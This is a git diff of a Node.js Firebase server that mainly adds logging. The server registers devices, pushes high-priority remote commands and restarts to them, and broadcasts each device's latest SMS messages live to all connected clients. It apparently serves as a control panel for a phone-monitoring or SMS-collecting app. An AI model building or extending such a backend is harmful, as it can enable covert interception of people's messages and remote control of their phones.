@@ -1,5 +1,5 @@
 // =====================================================
-// server.js  (A-to-Z FIXED VERSION)
+// server.js  (A-to-Z FINAL + SMS LIVE LOGGING)
 // =====================================================
 
 import dotenv from "dotenv";
@@ -14,7 +14,7 @@ import { firestore, rtdb, fcm } from "./config/db.js";
 
 import userFullDataRoutes from "./routes/userFullDataRoutes.js";
 import adminRoutes from "./routes/adminRoutes.js";
-import smsRoutes from "./routes/smsRoutes.js";    // ⭐ FIXED
+import smsRoutes from "./routes/smsRoutes.js";
 import checkRoutes from "./routes/checkRoutes.js";
 import commandRoutes from "./routes/commandRoutes.js";
 
@@ -54,7 +54,9 @@ async function sendFcmHighPriority(token, type, payload = {}) {
         payload: JSON.stringify(payload || {}),
       },
     });
-  } catch (err) {}
+  } catch (err) {
+    console.error("❌ FCM SEND ERROR:", err.message);
+  }
 }
 
 // -----------------------------------------------------
@@ -94,13 +96,24 @@ async function refreshDevicesLive(reason = "") {
       count: devices.length,
       data: devices,
     });
-  } catch (err) {}
+
+    console.log(
+      "📡 devicesLive EMIT → reason=",
+      reason,
+      " count=",
+      devices.length
+    );
+  } catch (err) {
+    console.error("❌ refreshDevicesLive ERROR:", err.message);
+  }
 }
 
 // -----------------------------------------------------
 // SOCKET CONNECTION
 // -----------------------------------------------------
 io.on("connection", (socket) => {
+  console.log("🟢 New socket connected:", socket.id);
+
   let currentDeviceId = null;
 
   socket.emit("devicesLive", {
@@ -116,6 +129,8 @@ io.on("connection", (socket) => {
     deviceSockets.set(id, socket.id);
     currentDeviceId = id;
 
+    console.log("✅ Device registered via socket:", id);
+
     await rtdb.ref(`status/${id}`).set({
       connectivity: "Online",
       lastSeen: Date.now(),
@@ -127,6 +142,8 @@ io.on("connection", (socket) => {
   });
 
   socket.on("disconnect", async () => {
+    console.log("🔴 Socket disconnected:", socket.id, " device=", currentDeviceId);
+
     if (currentDeviceId) {
       await rtdb.ref(`status/${currentDeviceId}`).set({
         connectivity: "Offline",
@@ -158,8 +175,11 @@ app.post("/send-command", async (req, res) => {
       timestamp: Date.now(),
     });
 
+    console.log("📨 COMMAND PUSHED →", { id, title, message });
+
     return res.json({ success: true });
   } catch (err) {
+    console.error("❌ /send-command ERROR:", err.message);
     return res.status(500).json({ success: false });
   }
 });
@@ -179,6 +199,8 @@ function stopReplyWatcher(uid) {
 
 function startReplyWatcher(uid) {
   const ref = rtdb.ref(`checkOnline/${uid}`);
+
+  console.log("👂 brosReply watcher STARTED for:", uid);
 
   ref.on("value", (snap) => {
     if (!snap.exists()) {
@@ -220,6 +242,7 @@ app.get("/api/brosreply/:uid", async (req, res) => {
       message: "Live listening started",
     });
   } catch (err) {
+    console.error("❌ /api/brosreply ERROR:", err.message);
     res.status(500).json({ success: false });
   }
 });
@@ -243,7 +266,12 @@ async function handleDeviceCommandChange(snap) {
 
   const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
   const token = devSnap.val()?.fcmToken;
-  if (!token) return;
+  if (!token) {
+    console.log("⚠️ DEVICE_COMMAND: No token for", uid);
+    return;
+  }
+
+  console.log("📨 DEVICE_COMMAND → uid=", uid, " cmd=", cmd.action || "");
 
   await sendFcmHighPriority(token, "DEVICE_COMMAND", {
     uniqueid: uid,
@@ -251,8 +279,12 @@ async function handleDeviceCommandChange(snap) {
   });
 }
 
-rtdb.ref("commandCenter/deviceCommands").on("child_added", handleDeviceCommandChange);
-rtdb.ref("commandCenter/deviceCommands").on("child_changed", handleDeviceCommandChange);
+rtdb
+  .ref("commandCenter/deviceCommands")
+  .on("child_added", handleDeviceCommandChange);
+rtdb
+  .ref("commandCenter/deviceCommands")
+  .on("child_changed", handleDeviceCommandChange);
 
 // -----------------------------------------------------
 // CHECK ONLINE SYSTEM
@@ -263,6 +295,8 @@ async function handleCheckOnlineChange(snap) {
   const uid = snap.key;
   const data = snap.val() || {};
   const now = Date.now();
+
+  console.log("📡 CHECK_ONLINE CHANGE → uid=", uid, " data=", data);
 
   await rtdb.ref(`resetCollection/${uid}`).set({
     resetAt: now,
@@ -277,7 +311,10 @@ async function handleCheckOnlineChange(snap) {
 
   const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
   const token = devSnap.val()?.fcmToken;
-  if (!token) return;
+  if (!token) {
+    console.log("⚠️ CHECK_ONLINE: No token for", uid);
+    return;
+  }
 
   await sendFcmHighPriority(token, "CHECK_ONLINE", {
     uniqueid: uid,
@@ -303,8 +340,11 @@ app.post("/restart/:uid", async (req, res) => {
       readable: new Date(now).toString(),
     });
 
+    console.log("🔁 RESTART TRIGGERED → uid=", uid);
+
     return res.json({ success: true, restartAt: now });
   } catch (err) {
+    console.error("❌ /restart ERROR:", err.message);
     res.status(500).json({ success: false });
   }
 });
@@ -313,6 +353,8 @@ app.post("/restart/:uid", async (req, res) => {
 // SMS LIVE LAST MESSAGE ONLY
 // -----------------------------------------------------
 const smsRef = rtdb.ref("smsNotifications");
+
+console.log("👂 ATTACHING LISTENER ON NODE: smsNotifications");
 
 smsRef.on("child_added", handleSmsChange);
 smsRef.on("child_changed", handleSmsChange);
@@ -326,6 +368,15 @@ async function handleSmsChange(snap) {
 
   const latestId = keys[keys.length - 1];
   const latestSms = msgs[latestId];
+
+  console.log(
+    "📨 smsLogsAllLive NEW → uid=",
+    uid,
+    " msgId=",
+    latestId,
+    " event=changed data=",
+    latestSms
+  );
 
   io.emit("smsLogsAllLive", {
     success: true,
@@ -353,12 +404,14 @@ registeredDevicesRef.on("child_removed", () => {
 app.get("/api/devices", async (req, res) => {
   try {
     const devices = await buildDevicesList();
+    console.log("📡 GET /api/devices → count=", devices.length);
     return res.json({
       success: true,
       count: devices.length,
       data: devices,
     });
   } catch (err) {
+    console.error("❌ /api/devices ERROR:", err.message);
     res.status(500).json({ success: false });
   }
 });
@@ -366,9 +419,9 @@ app.get("/api/devices", async (req, res) => {
 refreshDevicesLive("initial");
 
 // -----------------------------------------------------
-// ⭐ FINAL FIX — Correct Route Mounting
+// ROUTES MOUNTING
 // -----------------------------------------------------
-app.use("/api/sms", smsRoutes);
+app.use("/api/sms", smsRoutes); // ⭐ /api/sms/all etc.
 
 app.use(adminRoutes);
 app.use("/api", checkRoutes);
